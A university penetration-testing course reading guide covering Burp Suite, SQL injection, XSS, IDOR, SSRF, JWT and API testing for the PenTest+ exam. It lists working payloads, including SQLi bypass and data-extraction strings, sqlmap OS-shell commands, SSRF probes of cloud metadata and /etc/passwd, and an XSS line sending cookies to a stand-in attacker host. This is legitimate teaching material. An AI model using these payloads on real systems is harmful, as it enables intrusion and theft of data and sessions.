# Reading Guide: Module 09 — Web Application Penetration Testing

## Course: CIS-4333 Penetration Testing

## Texas Wesleyan University | Professor Nash

## Certification Alignment: CompTIA PenTest+ (PT0-002)

---

## Introduction

Module 09 covers web application penetration testing — testing the security of applications that accept input over HTTP/HTTPS. Web applications represent the most heavily targeted attack surface in modern computing. The OWASP Top 10 provides the industry-standard framework for categorizing web application risks, and Burp Suite is the industry-standard tool for testing them.

This module maps primarily to PT0-002 Domain 3: Attacks and Exploits (30% of exam). Web application questions appear frequently on the exam and cover both tool identification and vulnerability concept understanding.

**Legal and Ethical Reminder:** Web application testing must be explicitly authorized in the engagement scope. Even "harmless-looking" tests like SQL injection probes can cause data corruption, application crashes, or unintended data exposure. All lab work uses DVWA and other intentionally vulnerable applications in isolated environments. Never test web vulnerabilities against production applications or systems you do not own.

---

## 1. Burp Suite Component Reference

### Core Tools

| Component | Keyboard Shortcut | Primary Use |
|-----------|------------------|------------|
| Proxy | Ctrl+Shift+P | Intercept and modify HTTP/HTTPS traffic |
| Repeater | Ctrl+Shift+R | Manually resend modified requests |
| Intruder | Ctrl+Shift+I | Automated, iterative request fuzzing |
| Decoder | Ctrl+Shift+D | Encode/decode data (Base64, URL, HTML, hex) |
| Comparer | Ctrl+Shift+M | Diff two requests or responses |
| Target | Ctrl+Shift+T | Site map, scope definition |
| Sequencer | — | Analyze token randomness |
| Logger | — | Full request/response history |

### Proxy Setup

```text
1. Burp Suite > Proxy > Options
   - Confirm listener: 127.0.0.1:8080

2. Browser proxy settings:
   - HTTP Proxy: 127.0.0.1  Port: 8080
   - HTTPS Proxy: 127.0.0.1  Port: 8080

3. Install Burp CA Certificate:
   - Browse to http://burp (with proxy active)
   - Download cacert.der
   - Import into browser certificate store (Firefox: about:preferences > Privacy > Certificates)

4. Toggle Intercept in Proxy > Intercept tab
```

### Intruder Attack Types

| Type | Positions | Payloads | Use Case |
|------|----------|---------|---------|
| Sniper | Single | One list | Single field fuzzing |
| Battering Ram | Multiple | One list (same value all) | Repeated value across fields |
| Pitchfork | Multiple | Multiple lists (parallel) | Username + password pairs |
| Cluster Bomb | Multiple | Multiple lists (all combos) | Full brute force |

---

## 2. SQL Injection Reference

### SQLi Types

| Type | Mechanism | Indicators |
|------|-----------|-----------|
| Classic (In-band) | Results returned in response | Data visible in page |
| Union-based | UNION appends second query results | Same column count required |
| Error-based | SQL errors reveal database information | Error messages in response |
| Blind Boolean | True/false conditions change response | Different page content |
| Blind Time-based | Time delay confirms true condition | Response time difference |
| Out-of-band | Data exfil via DNS/HTTP callback | No in-band response needed |

### Testing Payloads

```text
# Basic injection test
'
''
1'
1"
1`

# Authentication bypass
' OR '1'='1
' OR '1'='1'--
' OR 1=1--
admin'--
' OR 1=1#

# Union-based — find column count
1 ORDER BY 1--
1 ORDER BY 2--
(increment until error to find column count)

# Union-based — find injectable column
1 UNION SELECT null,null,null--
1 UNION SELECT null,database(),null--

# Extract schema
1 UNION SELECT null,table_name,null FROM information_schema.tables--
1 UNION SELECT null,column_name,null FROM information_schema.columns WHERE table_name='users'--

# Extract data
1 UNION SELECT null,username,password FROM users--

# Time-based blind (MySQL)
1'; IF(1=1, SLEEP(5), 0)--
1 AND SLEEP(5)--
```

### sqlmap Reference

```bash
# Basic test
sqlmap -u "http://TARGET/page?id=1"

# POST request
sqlmap -u "http://TARGET/login" --data="user=admin&pass=test"

# With cookies
sqlmap -u "http://TARGET/page?id=1" --cookie="session=abc123"

# Enumerate databases
sqlmap -u "URL" --dbs

# Enumerate tables
sqlmap -u "URL" -D DATABASE_NAME --tables

# Dump table
sqlmap -u "URL" -D DATABASE_NAME -T TABLE_NAME --dump

# Attempt OS shell (if permissions allow)
sqlmap -u "URL" --os-shell

# Bypass WAF
sqlmap -u "URL" --tamper=space2comment,between
```

---

## 3. Cross-Site Scripting (XSS) Reference

### XSS Type Comparison

| Type | Persistence | Who Is Affected | Detection |
|------|-------------|----------------|----------|
| Reflected | None | Only the user who clicks the link | URL contains payload |
| Stored | Persistent in DB | All users who view the page | Payload in stored data |
| DOM-based | None | User whose browser processes it | JavaScript source analysis |

### XSS Test Payloads

```html
<!-- Basic alert tests -->
<script>alert('XSS')</script>
<script>alert(document.domain)</script>

<!-- Event handler bypasses (when script tags are filtered) -->
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
<body onload=alert('XSS')>
<input autofocus onfocus=alert('XSS')>

<!-- href-based -->
<a href="javascript:alert('XSS')">click</a>

<!-- Cookie stealing payload (replace with lab Burp Collaborator) -->
<script>document.location='http://ATTACKER/steal?c='+document.cookie</script>

<!-- Context escapes -->
</textarea><script>alert('XSS')</script>
"></textarea><script>alert('XSS')</script>
```

### XSS Injection Contexts

| Context | Technique |
|---------|-----------|
| HTML body | `<script>` or event handler tags |
| HTML attribute value | `"><script>alert(1)</script>` |
| JavaScript string | `'; alert(1);//` |
| URL in href | `javascript:alert(1)` |
| CSS | `expression(alert(1))` (legacy IE) |

---

## 4. IDOR and Access Control Testing

### IDOR Testing Methodology

1. Authenticate as a standard user (User A)
2. Perform an action that references an object (view profile, order, document)
3. Note the identifier in the URL, request body, or response
4. Modify the identifier (increment, decrement, UUID enumeration)
5. Observe whether unauthorized data is returned
6. Repeat from a second user account (User B) to confirm the issue

### Common IDOR Locations

```text
# URL parameters
GET /user/profile?id=1001
GET /api/orders/12345

# POST body
{"user_id": "1001", "action": "view_details"}

# Cookie or session parameter
Cookie: user_id=1001

# API path parameters
GET /api/v1/accounts/1001/transactions
```

### Testing IDOR with Burp

- Use Proxy to capture the request
- Send to Repeater
- Modify the identifier and resend
- Use Intruder with a number range payload to enumerate systematically

---

## 5. SSRF Reference

### SSRF Testing Points

Look for parameters that accept URLs, IP addresses, or hostnames:

```text
url=
link=
redirect=
next=
target=
dest=
proxy=
image_url=
fetch=
```

### SSRF Payloads

```text
# Internal network probing
http://127.0.0.1:80
http://127.0.0.1:22
http://127.0.0.1:3306
http://192.168.1.1

# Cloud metadata endpoints
http://169.254.169.254/latest/meta-data/          (AWS)
http://metadata.google.internal/computeMetadata/  (GCP)
http://169.254.169.254/metadata/instance          (Azure)

# File read via SSRF
file:///etc/passwd
file:///etc/hosts
file:///C:/Windows/win.ini

# Filter bypass techniques
http://[::1]/                  (IPv6 localhost)
http://0x7f000001/             (hex encoding)
http://2130706433/             (decimal encoding)
http://127.1/                  (short form)
```

---

## 6. Authentication and Session Testing

### Authentication Bypass Checklist

```text
[ ] Test default credentials (admin/admin, admin/password, root/root)
[ ] Test SQLi in login fields: username=admin'-- password=anything
[ ] Test empty password
[ ] Test username enumeration (different responses for valid vs. invalid usernames)
[ ] Check for account lockout after N failures
[ ] Test password reset flow for predictability or token reuse
[ ] Check JWT tokens: decode payload, test none algorithm, test key confusion
[ ] Test remember-me functionality for long-lived tokens
[ ] Test session token entropy (Burp Sequencer)
[ ] Verify logout invalidates the server-side session
```

### JWT Testing

```bash
# Decode JWT (three base64 parts separated by dots)
echo "HEADER_PART" | base64 -d
echo "PAYLOAD_PART" | base64 -d

# Test none algorithm attack
# Modify header: {"alg":"none","typ":"JWT"}
# Modify payload: {"role":"admin"}
# Remove signature, keep trailing dot
# Resulting token: base64(header).base64(payload).

# Use jwt_tool for automated testing
python3 jwt_tool.py TOKEN -X a  # none algorithm attack
python3 jwt_tool.py TOKEN -C -d wordlist.txt  # crack weak secret
```

---

## 7. API Testing Reference

### API Discovery

```bash
# Directory brute force for API endpoints
ffuf -u https://TARGET/FUZZ -w /usr/share/seclists/Discovery/Web-Content/api-endpoints.txt

# Common API documentation paths
/swagger
/swagger-ui.html
/api-docs
/openapi.json
/v1/docs
/redoc
```

### API Testing Checklist

```text
[ ] Test each endpoint with no authentication
[ ] Test each endpoint with another user's authentication
[ ] Test HTTP method changes (GET → PUT, DELETE)
[ ] Test for BOLA (change object IDs in path and body)
[ ] Test for mass assignment (add extra properties to POST body)
[ ] Test for BFLA (access admin-only endpoints as regular user)
[ ] Check for excessive data exposure (filter response for unexpected fields)
[ ] Test CORS configuration (Origin: attacker.com header)
[ ] Fuzz all input parameters for injection
[ ] Check rate limiting on sensitive endpoints (login, password reset)
```

---

## 8. OWASP Top 10 (2021) Study Reference

| Rank | Category | Key Vulnerabilities | PT0-002 Test Focus |
|------|----------|--------------------|--------------------|
| A01 | Broken Access Control | IDOR, privilege escalation, CORS | Most common finding |
| A02 | Cryptographic Failures | Cleartext HTTP, weak TLS, hardcoded keys | Data in transit/rest |
| A03 | Injection | SQLi, command injection, LDAP injection | SQLi specifically tested |
| A04 | Insecure Design | Missing rate limiting, no account lockout | Architecture review |
| A05 | Security Misconfiguration | Default creds, verbose errors, open S3 | Quick wins |
| A06 | Vulnerable and Outdated Components | CVEs in libraries, unpatched dependencies | Version detection |
| A07 | Identification and Authentication Failures | Weak passwords, broken session mgmt | Session/JWT testing |
| A08 | Software and Data Integrity Failures | Insecure deserialization, supply chain | Object serialization |
| A09 | Security Logging and Monitoring Failures | No audit logs, alerts not configured | Detection gap |
| A10 | Server-Side Request Forgery | SSRF to internal services | Cloud metadata |

---

## 9. PenTest+ Exam Tips

- **Burp Suite component identification**: The exam presents scenarios and asks which Burp component is appropriate. Proxy = intercept; Repeater = manual resend; Intruder = automated fuzzing; Decoder = encoding/decoding.

- **SQLi vs. XSS**: Know the difference. SQLi targets the database through unvalidated input. XSS targets other users' browsers through unescaped output.

- **IDOR classification**: IDOR falls under OWASP A01 (Broken Access Control). The exam tests this classification.

- **SSRF target**: AWS IMDSv1 endpoint `169.254.169.254` is the canonical SSRF target on cloud infrastructure exams. Know it.

- **XSS impact**: Reflected XSS requires the victim to click a crafted link. Stored XSS executes for every user who views the affected page. Stored XSS is more impactful.

- **JWT none algorithm**: Changing the algorithm to "none" and removing the signature is a known JWT attack. Some misconfigured servers accept unsigned tokens.

- **sqlmap `-level` and `-risk`**: Higher levels test more injection points; higher risk uses more potentially disruptive payloads. Default is level 1, risk 1 — safest for authorized tests.

---

## 10. Study Checklist

- [ ] Set up Burp Suite Community Edition with browser proxy and CA certificate
- [ ] Explain the purpose of each core Burp Suite component
- [ ] Perform a union-based SQL injection against DVWA in the lab
- [ ] Identify and exploit a reflected and a stored XSS in DVWA
- [ ] Test for IDOR by modifying object references in Burp Repeater
- [ ] Describe SSRF and identify two high-value internal targets (cloud metadata, internal services)
- [ ] Test authentication bypass using SQLi in a login form
- [ ] Complete the Module 09 lab and submit all deliverables
- [ ] Review OWASP Top 10 (2021) categories prior to quiz

---

**Proprietary and Confidential. Not for disclosure outside of Texas Wesleyan University course use.**
